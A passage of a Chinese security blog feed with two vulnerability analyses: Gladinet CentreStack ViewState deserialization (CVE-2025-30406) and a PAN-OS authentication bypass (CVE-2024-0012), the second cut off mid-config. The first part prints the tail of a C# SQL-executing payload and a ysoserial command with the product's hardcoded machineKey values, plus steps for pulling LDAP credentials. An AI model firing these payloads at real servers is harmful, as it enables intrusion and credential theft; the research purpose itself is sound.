class="hljs-built_in">object</span>[] &#123; cmd &#125;);<br><br><br>            <span class="hljs-comment">// 处理结果</span><br>            <span class="hljs-keyword">if</span> (data != <span class="hljs-literal">null</span>)<br>            &#123;<br>                <span class="hljs-keyword">return</span> SerializeToJson(data);<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#123;\&quot;success\&quot;:false,\&quot;message\&quot;:\&quot;No data returned\&quot;&#125;&quot;</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception ex)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#123;\&quot;success\&quot;:false,\&quot;message\&quot;:\&quot;&quot;</span> + EscapeJsonString(ex.Message) + <span class="hljs-string">&quot;\&quot;&#125;&quot;</span>;<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">E</span>()</span><br>    &#123;<br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            HttpContext context = HttpContext.Current;<br>            context.Server.ClearError();<br>            context.Response.Clear();<br>            context.Response.ContentType = <span class="hljs-string">&quot;application/json&quot;</span>;<br>            context.Response.Write(GetData());<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception ex)<br>        &#123;<br>            HttpContext.Current.Response.Write(<span class="hljs-string">&quot;&#123;\&quot;success\&quot;:false,\&quot;message\&quot;:\&quot;&quot;</span> + EscapeJsonString(ex.ToString()) + <span class="hljs-string">&quot;\&quot;&#125;&quot;</span>);<br>        &#125;<br>        HttpContext.Current.Response.Flush();<br>        HttpContext.Current.Response.End();<br>    &#125;<br>&#125; <br><br><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">.\ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile --decryptionkey=&quot;B4C3E4CB6CAF27CA9F7909640A4D608CC4458173F13E09C9&quot; --validationkey=&quot;5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16&quot; --generator=3FE2630A -c &quot;CentreStack.ExecSql.cs;System.dll;System.Web.dll;System.Data.dll;System.Xml.dll;System.Runtime.Extensions.dll&quot;<br></code></pre></td></tr></table></figure><p><img src="/../../images/image30.png" alt="图片"></p><p>CentreStack 中部分表介绍：</p><ul><li>xaf_user：邮箱信息</li><li>xaf_namedvalue：配置项，name&#x3D;ldap_endpoint 的就是 LDAP 的连接信息可以解密</li><li>csmain_xaf_files：文件信息（ 名称、路径 ）</li><li>…..</li></ul><p>xaf_namedvalue 中的 ldap_endpoint  是加密的，但是解密方式和数据库连接信息的完全相同。</p><p><img src="/../../images/image31.png" alt="图片"></p><p>LDAP 批量获取：</p><p><img src="/../../images/image-20250515112801495.png" alt="image-20250515112801495"></p><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><h3 id="硬编码凭证"><a href="#硬编码凭证" class="headerlink" title="硬编码凭证"></a>硬编码凭证</h3><p>GladinetPayFlow.dll 中发现部分 Gladinet 相关平台的 API KEY。这里不展示了。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>machineKey 从硬编码更改为随机生成。</p><p><img src="/../../images/image-20250515123323990.png" alt="image-20250515123323990"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.huntress.com/blog/cve-2025-30406-critical-gladinet-centrestack-triofox-vulnerability-exploited-in-the-wild">https://www.huntress.com/blog/cve-2025-30406-critical-gladinet-centrestack-triofox-vulnerability-exploited-in-the-wild</a></li><li><a href="https://exp10it.io/2024/02/asp-net-viewstate-deserialization/">https://exp10it.io/2024/02/asp-net-viewstate-deserialization/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2024-0012 Palo Alto 认证绕过漏洞分析</title>
      <link href="/2025/05/06/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2024-0012/"/>
      <url>/2025/05/06/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2024-0012/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞编号：CVE-2024-0012 </p><p>漏洞名称：Palo Alto Networks PAN-OS Management 管理端权限绕过漏洞</p><p>漏洞原理：nginx 配置问题导致在处理 .js.map$ 路由的时候无需身份验证，导致认证绕过，可以配合 CVE-2024-9474 实现命令执行。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>搭建版本：11.0.2</p><p>出现问题：vm login 登不上，解决方法等待系统可能还在初始化。初始化过程中会出现 IP 地址，WEB 的账号密码和 CLI 是相通的，可以在 WEB 上面修改。</p><p>默认用户密码：admin</p><p><a href="https://172.253.1.163/">https://172.253.1.163</a></p><p><img src="/../../images/image-20250515144753672.png" alt="image-20250515144753672"></p><p>登录后 CLI 的，通过 RCE 漏洞修改 admin 用户的 shell。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">usermod -s <span class="hljs-regexp">/bin/</span>bash admin<br></code></pre></td></tr></table></figure><p><img src="/../../images/image-20250515144954102.png" alt="image-20250515144954102"></p><p>测试过直接添加一个用户（通过执行 shell 脚本，漏洞有长度限制），可以通过 admin 切换到该用户，但是不能直接登录。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">usermod -aG root admin</span><br></code></pre></td></tr></table></figure><p>下载链接：</p><ul><li><a href="https://mirror.cloudpropeller.com/paloalto/vm-series/PA-VM-ESX-11.1.4.ova">https://mirror.cloudpropeller.com/paloalto/vm-series/PA-VM-ESX-11.1.4.ova</a></li><li><a href="https://mirror.cloudpropeller.com/paloalto/vm-series/PA-VM-ESX-11.1.4-h7.ova">https://mirror.cloudpropeller.com/paloalto/vm-series/PA-VM-ESX-11.1.4-h7.ova</a></li><li><a href="https://mirror.cloudpropeller.com/paloalto/vm-series/PA-VM-ESX-10.1.9-h1.ova">https://mirror.cloudpropeller.com/paloalto/vm-series/PA-VM-ESX-10.1.9-h1.ova</a></li><li><a href="https://mirror.cloudpropeller.com/paloalto/vm-series/PA-VM-ESX-11.0.2.ova">https://mirror.cloudpropeller.com/paloalto/vm-series/PA-VM-ESX-11.0.2.ova</a></li><li><a href="https://download.cloudcyte.com/VMs/PA-VM-ESX-10.1.7.ova">https://download.cloudcyte.com/VMs/PA-VM-ESX-10.1.7.ova</a></li></ul><h2 id="环境分析"><a href="#环境分析" class="headerlink" title="环境分析"></a>环境分析</h2><h3 id="基本架构"><a href="#基本架构" class="headerlink" title="基本架构"></a>基本架构</h3><p>通过进程可以发现有：</p><p>httpd &#x3D;&gt; apache</p><p>nginx</p><p><img src="/../../images/image-20250515151043095.png" alt="image-20250515151043095"></p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">netstat -tulnp | <span class="hljs-type">grep</span> -E &#x27;httpd|<span class="hljs-type">nginx</span>&#x27;<br></code></pre></td></tr></table></figure><p><img src="/../../images/image-20250515152913827.png" alt="image-20250515152913827"></p><p>nginx 监听 80,443</p><p>apache 监听 28250</p><p><img src="/../../images/image-20250515153126042.png" alt="image-20250515153126042"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> -R <span class="hljs-string">&#x27;proxy_pass&#x27;</span> <span class="hljs-regexp">/etc/</span>nginx/<br></code></pre></td></tr></table></figure><p><img src="/../../images/image-20250515153257041.png" alt="image-20250515153257041"></p><p>所以可以知道是 Apache + PHP 提供 WEB 服务，Nginx 作为反向代理</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">request</span> <span class="hljs-operator">=</span>&gt; nginx(<span class="hljs-number">443</span>) <span class="hljs-operator">=</span>&gt; apache(<span class="hljs-number">28250</span>) <span class="hljs-operator">=</span>&gt; php<br></code></pre></td></tr></table></figure><h3 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h3><p>所以 WEB 其实是由 apache 启动的，查看 apache 配置：</p><p><img src="/../../images/image-20250515154100204.png" alt="image-20250515154100204"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> /etc/httpd/mgmtui/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span><br><span class="hljs-keyword">grep</span> -Ev <span class="hljs-string">&#x27;^\s*#|^\s*$&#x27;</span> /etc/httpd/mgmtui/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Apache 配置文件、模块等的根目录（并非网站根目录）</span><br>ServerRoot <span class="hljs-string">&quot;/etc/httpd/mgmtui&quot;</span><br><span class="hljs-comment"># Apache 启动后记录 PID 的位置</span><br>PidFile <span class="hljs-string">&quot;/var/run/mgmtui/httpd.pid&quot;</span><br><span class="hljs-comment"># 核心转储文件保存目录</span><br>CoreDumpDirectory <span class="hljs-string">&quot;/var/cores&quot;</span><br><span class="hljs-comment"># Apache 监听本地 28250 端口</span><br>Listen 28250<br><br><span class="hljs-comment"># 监听所有 IP 的 28250 端口</span><br>&lt;VirtualHost _default_:28250&gt;<br><span class="hljs-comment"># 设置环境变量，抓取 Authorization 头内容</span><br>    SetEnvIf Authorization <span class="hljs-string">&quot;(.*)&quot;</span> _HTTP_AUTHORIZATION=<span class="hljs-variable">$1</span><br>&lt;/VirtualHost&gt;<br><br><span class="hljs-comment"># 加载 conf.modules.d 配置</span><br>Include conf.modules.d/*.conf<br><br>User nobody<br>Group nobody<br>ServerName 127.0.0.1<br><span class="hljs-comment"># WEB 根目录</span><br>DocumentRoot <span class="hljs-string">&quot;/var/appweb/htdocs&quot;</span><br><br><span class="hljs-comment"># 如果访问 /PAN_help/*.css|js|html|htm，重写为 .gz 文件（用于前端资源压缩加载）</span><br>&lt;Location <span class="hljs-string">&quot;/&quot;</span>&gt;<br>    DirectorySlash off<br>    RewriteEngine on<br>    RewriteRule ^(.*)(\/PAN_help\/)(.*)\.(css|js|html|htm)$ $1$2<span class="hljs-variable">$3</span>.<span class="hljs-variable">$4</span>.gz [QSA,L]<br>    AddEncoding gzip .gz<br>    Options Indexes FollowSymLinks<br>    Require all granted<br>&lt;/Location&gt;<br><br><span class="hljs-comment"># 禁止访问 .htaccess 等以 .ht 开头的文件</span><br>&lt;Files <span class="hljs-string">&quot;.ht*&quot;</span>&gt;<br>    Require all denied<br>&lt;/Files&gt;<br>&lt;Files <span class="hljs-string">&quot;*.css.gz&quot;</span>&gt;<br>    ForceType text/css<br>&lt;/Files&gt;<br>&lt;Files <span class="hljs-string">&quot;*.js.gz&quot;</span>&gt;<br>    ForceType application/javascript<br>&lt;/Files&gt;<br>&lt;Files <span class="hljs-string">&quot;*.html.gz&quot;</span>&gt;<br>    ForceType text/html<br>&lt;/Files&gt;<br>&lt;Files <span class="hljs-string">&quot;*.htm.gz&quot;</span>&gt;<br>    ForceType text/html<br>&lt;/Files&gt;<br>ErrorLogFormat <span class="hljs-string">&quot;%&#123;cu&#125;t %l [%P %&#123;g&#125;T] %F: %E: %M&quot;</span><br>ErrorLog <span class="hljs-string">&quot;/var/log/pan/mgmt_httpd_error.log&quot;</span><br>LogLevel info<br>LogFormat <span class="hljs-string">&quot;%&gt;s %t %T %b %U \&quot;%&#123;User-Agent&#125;i\&quot;&quot;</span> combined<br>LogFormat <span class="hljs-string">&quot;%&gt;s %t %T %b %U \&quot;%&#123;User-Agent&#125;i\&quot;&quot;</span> common<br>LogFormat <span class="hljs-string">&quot;%&gt;s %t %T %b %U \&quot;%&#123;User-Agent&#125;i\&quot;&quot;</span> combinedio<br>CustomLog <span class="hljs-string">&quot;/var/log/pan/mgmt_httpd_access.log&quot;</span> combined<br>TypesConfig /etc/httpd/mime.types<br>AddType application/x-compress .Z<br>AddType application/x-gzip .gz .tgz<br>AddDefaultCharset UTF-8<br>MIMEMagicFile conf/magic<br>EnableMMAP off<br>FileETag None<br></code></pre></td></tr></table></figure><p>子配置：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">ServerRoot <span class="hljs-string">&quot;/etc/httpd/mgmtui&quot;</span><br>Include <span class="hljs-keyword">conf</span>.modules.d/*.<span class="hljs-keyword">conf</span><br><br><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">al</span> /etc/httpd/mgmtui/<span class="hljs-keyword">conf</span>.modules.d<br></code></pre></td></tr></table></figure><p><img src="/../../images/image-20250515155025136.png" alt="image-20250515155025136"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> -Ev <span class="hljs-string">&#x27;^\s*#|^\s*$&#x27;</span> <span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/mgmtui/</span>conf.modules.d/php-httpd.conf<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 加载 PHP7 模块，使 Apache 能解析 .php 文件</span><br>LoadModule php7_module ../modules/libphp7.so<br><br><span class="hljs-comment"># 禁止 Web 客户端访问以 .user.ini 命名的文件（通常用于 PHP 的用户级配置）</span><br>&lt;Files <span class="hljs-string">&quot;.user.ini&quot;</span>&gt;<br>   Order allow,deny      <span class="hljs-comment"># 默认 deny 优先</span><br>   Deny from all          <span class="hljs-comment"># 拒绝所有访问</span><br>   Satisfy All            <span class="hljs-comment"># 所有条件都需满足（主要用于兼容旧版 Apache）</span><br>&lt;/Files&gt;<br><br><span class="hljs-comment"># 将 .php 文件交给 PHP 模块处理</span><br>AddHandler application/x-httpd-php .php<br><br><span class="hljs-comment"># 指定 php.ini 的位置（PHP 配置文件）</span><br>PHPINIDir <span class="hljs-string">&quot;/etc/httpd/mgmtui&quot;</span><br><br><span class="hljs-comment"># 当访问目录时，默认首页文件为 index.php</span><br>DirectoryIndex index.php<br><br><span class="hljs-comment"># 特殊情况：将名为 ocsp 的文件（无扩展名）当作 PHP 文件处理</span><br>&lt;FilesMatch ^ocsp$&gt;<br>   SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p>PHP 配置文件：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> -vE <span class="hljs-string">&#x27;^\s*;|^\s*$&#x27;</span> <span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/mgmtui/</span>php.ini<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[PHP]</span><br><br><span class="hljs-attr">auto_prepend_file</span> = uiEnvSetup.php <span class="hljs-comment">; PAN-MODIFIED</span><br><span class="hljs-attr">default_mimetype</span> = <span class="hljs-string">&quot;text/html&quot;</span><br><span class="hljs-attr">default_charset</span> = <span class="hljs-string">&quot;UTF-8&quot;</span><br><span class="hljs-attr">include_path</span> = <span class="hljs-string">&quot;.:/var/appweb/htdocs/phpincludes:/usr/lib64/php/modules&quot;</span> <span class="hljs-comment">; PAN-MODIFIED</span><br><span class="hljs-attr">extension_dir</span> = <span class="hljs-string">&quot;/usr/lib64/php/modules&quot;</span> <span class="hljs-comment">; PAN-MODIFIED - likely not needed. it is already working</span><br></code></pre></td></tr></table></figure><ul><li><p>auto_prepend_file：在每个PHP脚本开始执行前自动包含进来</p></li><li><p>include_path：设置include()或require()函数包含文件的参考路径</p></li><li><p>extension_dir：php 扩展目录</p></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>appweb<span class="hljs-regexp">/htdocs/i</span>ndex.php<br></code></pre></td></tr></table></figure><p><img src="/../../images/image-20250515164804368.png" alt="image-20250515164804368"></p><p><img src="/../../images/image-20250515164831574.png" alt="image-20250515164831574"></p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">request =&gt; nginx(<span class="hljs-number">443</span>) =&gt; apache(<span class="hljs-number">28250</span>) =&gt; php(php.ini,index.php) =&gt; envSetup.php =&gt; target.php<br></code></pre></td></tr></table></figure><p>打包 web 目录分析。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">tar -czvf htdocs.tar.gz <span class="hljs-regexp">/var/</span>appweb<span class="hljs-regexp">/htdocs/</span><br></code></pre></td></tr></table></figure><h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> aux | <span class="hljs-keyword">grep</span> nginx<br></code></pre></td></tr></table></figure><p><img src="/../../images/image-20250516181804420.png" alt="image-20250516181804420"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">tar -czvf nginx<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span> /etc/nginx<br></code></pre></td></tr></table></figure><p>nginx.conf：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><br><span class="hljs-section">http</span> &#123;<br>  <span class="hljs-comment"># 定义上游服务器, request =&gt; nginx =&gt; backend_mgmt</span><br>  <span class="hljs-section">upstream</span> backend_mgmt &#123;<br>    <span class="hljs-attribute">server</span> <span class="hljs-number">127.0.0.1:28250</span>;<br>  &#125;<br>  <span class="hljs-comment"># 上游服务器返回的跳转处理: 28250 =&gt; Location http://xxx:28250/php/login.php =&gt; Location http://xxx:80/php/login.php(nginx)</span><br>  <span class="hljs-attribute">proxy_redirect</span> http://<span class="hljs-variable">$host</span>:28250/ <span class="hljs-variable">$scheme</span>://<span class="hljs-variable">$host</span>:<span class="hljs-variable">$server_port</span>/;<br>  <span class="hljs-attribute">proxy_redirect</span> http://<span class="hljs-variable">$proxy_host</span>:28250/ <span class="hljs-variable">$scheme</span>://<span class="hljs-variable">$host</span>:<span class="hljs-variable">$server_port</span>/;<br><br><br><br>  <span class="hljs-comment"># https server</span><br>  <span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">443</span> ssl default_server ipv6only=<span class="hljs-literal">off</span>;<br>    <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">4443</span> ssl ipv6only=<span class="hljs-literal">off</span>;<br><br><span class="hljs-comment"># $gohost 表示上游服务</span><br>    <span class="hljs-attribute">set</span> <span class="hljs-variable">$gohost</span> <span class="hljs-string">&quot;backend_mgmt&quot;</span>;<br>    <span class="hljs-attribute">set</span> <span class="hljs-variable">$devonly</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-attribute">set</span> <span class="hljs-variable">$gohostExt</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-attribute">set</span> <span class="hljs-variable">$wf_pub</span> <span class="hljs-string">&quot;wildfire.paloaltonetworks.com&quot;</span>;<br>    <span class="hljs-attribute">set</span> <span class="hljs-variable">$wf_pri</span> <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-comment"># 包含了一个子配置</span><br>    <span class="hljs-attribute">include</span> conf/locations.conf;<br>  &#125;<br><br>  <span class="hljs-comment"># http server</span><br>  <span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">80</span> ipv6only=<span class="hljs-literal">off</span>;<br><br>    <span class="hljs-comment"># include location rules</span><br>    <span class="hljs-attribute">set</span> <span class="hljs-variable">$gohost</span> <span class="hljs-string">&quot;backend_mgmt&quot;</span>;<br>    <span class="hljs-attribute">set</span> <span class="hljs-variable">$devonly</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-attribute">set</span> <span class="hljs-variable">$gohostExt</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-attribute">set</span> <span class="hljs-variable">$wf_pub</span> <span class="hljs-string">&quot;wildfire.paloaltonetworks.com&quot;</span>;<br>    <span class="hljs-attribute">set</span> <span class="hljs-variable">$wf_pri</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-attribute">include</span> conf/locations.conf;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>conf&#x2F;locations.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span 